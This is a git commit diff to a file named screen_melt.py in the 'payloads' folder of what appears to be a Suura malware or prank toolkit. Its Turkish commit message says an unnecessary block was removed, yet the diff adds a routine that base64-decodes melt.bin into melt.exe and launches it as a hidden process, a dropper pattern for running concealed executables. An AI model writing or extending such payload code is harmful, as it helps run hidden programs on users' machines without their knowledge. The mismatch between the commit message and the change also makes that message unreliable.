5501bc8a588c2cefc408e964fb6d4dfee85d662e
Alperen <148077179+dotPEEKs@users.noreply.github.com>
2024-08-01 20:25:25 +0300

    gereksiz kod bloğu kaldırıldı

--- includes/payloads/screen_melt.py
+++ includes/payloads/screen_melt.py
@@ -1,8 +1,14 @@
+import os
+import base64
 from Suura.includes.suura_subprocess import *
 
-def MelterPayload(path):
-    p = Process()
-    p.process_type = ProcessType.open_hide_process
-    p.command = "cmd.exe"
-    p.parameter = path
-    p.exec()
+def MelterPayload():
+    if os.path.exists(os.path.abspath("melt.bin")):
+        with open("melt.bin","rb") as melt_fd:
+            bin_content = base64.b64decode(melt_fd.read())
+        with open("melt.exe","wb") as raw_melt_fd:
+            raw_melt_fd.write(bin_content)
+        process = Process()
+        process.process_type = ProcessType.open_hide_process
+        process.command = os.path.abspath("melt.exe")
+        process.exec()
